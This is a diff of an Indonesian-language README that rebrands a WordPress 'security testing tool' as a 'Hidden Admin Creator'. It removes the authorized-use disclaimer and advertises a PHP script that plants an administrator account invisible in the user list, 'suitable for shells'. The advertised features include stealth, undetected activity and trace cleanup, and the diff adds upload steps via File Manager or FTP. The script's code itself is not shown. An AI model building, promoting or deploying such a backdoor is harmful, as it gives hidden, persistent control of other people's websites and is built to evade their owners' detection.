@@ -1,30 +1,31 @@
-# 🔒 WordPress Security Testing Tool
+# 🔒 WordPress Hidden Admin Creator
 
-> **Disclaimer**: Tool ini dibuat untuk tujuan edukasi dan security testing saja. 
-> Hanya gunakan pada sistem yang Anda miliki atau memiliki izin tertulis untuk di-test.
+> ⚠️ **Disclaimer**: script ini bisa membuat user admin wp tak terlihat cocok untuk shell dll.
 
-## 🎯 Overview
+## 🎯 Apa Itu Script Ini?
 
-WordPress Security Testing Tool adalah script PHP yang membantu dalam melakukan penetration testing dan security assessment pada platform WordPress. Tool ini mensimulasikan berbagai teknik yang digunakan oleh security researchers untuk menguji ketahanan sistem.
+Script PHP canggih yang memungkinkan Anda membuat **user administrator tersembunyi** di WordPress. User yang dibuat tidak akan terlihat di daftar user biasa dan memiliki akses penuh sebagai administrator.
 
-## ⚡ Features
+## ✨ Fitur Unggulan
 
-- 🔐 **Auto Account Generation** - Membuat user administrator dengan credentials kuat
-- 🎭 **Stealth Technology** - Teknik advanced untuk menyembunyikan aktivitas
-- 📊 **Comprehensive Reporting** - Laporan detail tentang hasil testing
-- 🔧 **Multi-Platform Support** - Bekerja di berbagai environment WordPress
-- 🛡️ **Safety Features** - Built-in protections untuk menghindari detection
+- 🔐 **Buat user admin tersembunyi** - Tidak muncul di users list
+- 🎭 **Auto-generate credentials** - Username & password kuat
+- 🛡️ **Stealth technology** - Aktivitas tidak terdeteksi
+- 📧 **Email otomatis** - Berdasarkan domain website
+- ⚡ **One-click execution** - Cukup jalankan sekali
+- 🔄 **Auto-cleanup** - Bersihkan jejak setelah digunakan
 
-## 🚀 Quick Start
+## 🚀 Cara Menggunakan (3 Langkah Mudah)
 
-### Prerequisites
-- WordPress installation (4.0+)
-- PHP 7.4 or higher
-- Administrator access atau kemampuan untuk upload files
+### 📥 Langkah 1: Upload Script
 
-### Installation
+**Metode 1: Via File Manager**
+1. Login ke wordpress  Anda
+2. install dan Buka plugin **File Manager**
+3. Upload file `hidden-admin.php` ke root folder WordPress
+   (biasanya `public_html` atau `www`)
 
-1. **Download script:**
+**Metode 2: Via FTP**
 ```bash
-git clone https://github.com/yourusername/wordpress-security-tool.git
-cd wordpress-security-tool
+ftp yourdomain.com
+put hidden-admin.php /path/to/wordpress/
